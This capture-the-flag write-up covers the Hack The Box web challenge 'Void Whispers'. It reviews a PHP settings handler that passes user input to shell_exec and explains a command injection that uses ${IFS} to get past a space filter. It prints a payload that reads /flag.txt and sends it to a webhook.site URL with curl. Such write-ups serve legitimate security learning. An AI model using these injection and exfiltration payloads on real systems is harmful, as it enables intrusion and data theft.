---
title: Void Whispers - Hack The Box
date: 2024-12-11
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Void Whispers 🎃

## Challenge description

In the dead of night, an eerie silence envelops the town, broken only by the faintest of echoes—whispers in the void. A
phantom mailer is sending out silent commands, unseen and unheard, manipulating systems from the shadows. The townsfolk
remain oblivious to the invisible puppeteer pulling their strings. Legends hint that sending the right silent message
back could reveal hidden secrets. Can you tap into the darkness, craft the perfect unseen command, and shut down the
malevolent force before it plunges the world into chaos?

## Challenge overview

The challenge involves a web application that provides an interface to configure email settings. By exploiting
vulnerabilities in the configuration functionality, we can gain unauthorized access to sensitive data.

![Void Whispers - Overview](/ctf/hack-the-box/challenges/web/void-whispers/overview.png)

## Code review

### `IndexController.php`

The `updateSetting` function handles updates to email configurations. It validates the `sendMailPath` parameter to
ensure no spaces are present and verifies the binary's existence using the `which` command. If validation passes, the
function updates the configuration file.

```php
public function updateSetting($router)
{
    $from = $_POST['from'];
    $mailProgram = $_POST['mailProgram'];
    $sendMailPath = $_POST['sendMailPath'];
    $email = $_POST['email'];
    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
        return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
    }

    if (preg_match('/\s/', $sendMailPath)) { // [!code focus]
        return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
    }

    $whichOutput = shell_exec("which $sendMailPath"); // [!code focus]
    if (empty($whichOutput)) {
        return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
    }

    $this->config['from'] = $from;
    $this->config['mailProgram'] = $mailProgram;
    $this->config['sendMailPath'] = $sendMailPath;
    $this->config['email'] = $email;

    file_put_contents($this->configFile, json_encode($this->config));

    return $router->jsonify(['message' => 'Config updated successfully!', 'status' => 'success'], 200);
}
```

**Vulnerabilities Identified**

1. Space Validation Bypass
   The `preg_match('/\s/', $sendMailPath)` validation can be bypassed using `${IFS}`, a shell variable representing a
   space character.

2. Command Injection
   The `shell_exec("which $sendMailPath")` function directly executes shell commands without sanitization. Injecting
   commands into the `sendMailPath` parameter allows arbitrary command execution.

## Exploitation

### Step 1: Space Validation Bypass

To bypass the `preg_match` validation for spaces, we use `${IFS}` (Internal Field Separator) to represent spaces. For
example:

```bash
/usr/sbin/sendmail;${IFS}whoami
```

This payload bypasses the space check and allows command injection.

### Step 2: Command Injection

Using the command injection vulnerability, we can craft a payload to execute arbitrary commands. For instance, to
retrieve the flag:

```bash
/usr/sbin/sendmail;curl${IFS}https://webhook.site/your-webhook-url?flag=$(cat${IFS}/flag.txt)
```

::: info **Explanation of Payload**:

- `/usr/sbin/sendmail`: A valid command to pass initial validation.
- `;`: Ends the first command and starts a new one.
- `curl${IFS}https://webhook.site/your-webhook-url?flag=`: Sends an HTTP request with the flag content.
- `$(cat${IFS}/flag.txt)`: Reads the `flag.txt` file and appends its content to the `flag` parameter.

:::

### Step 3: Sending the Exploit

Set the `sendMailPath` parameter to the crafted payload and send the form. The application will execute the payload,
sending the flag to the specified WebHook.

### Step 4: Retrieving the Flag

Monitor your WebHook for incoming requests. The flag will appear in the request URL:

```bash
https://webhook.site/5ae0b38c-d624-49c7-8c83-eb3b56728f18?flag=HTB{f4k3_fl4g_f0r_t35t1ng}
```

With the fake flag retrieved, we can use the same technique to get the real flag on the HTB server.

<ChallengeCard
    challengeType="web"
    challengeName="Void Whispers"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/808"
/>

## References

- [Filter Evasion in a REVERSE SHELL (no spaces!!) - John Hammond](https://www.youtube.com/watch?v=mEGnhfOX-xs)
- [WebHook.site](https://webhook.site/)
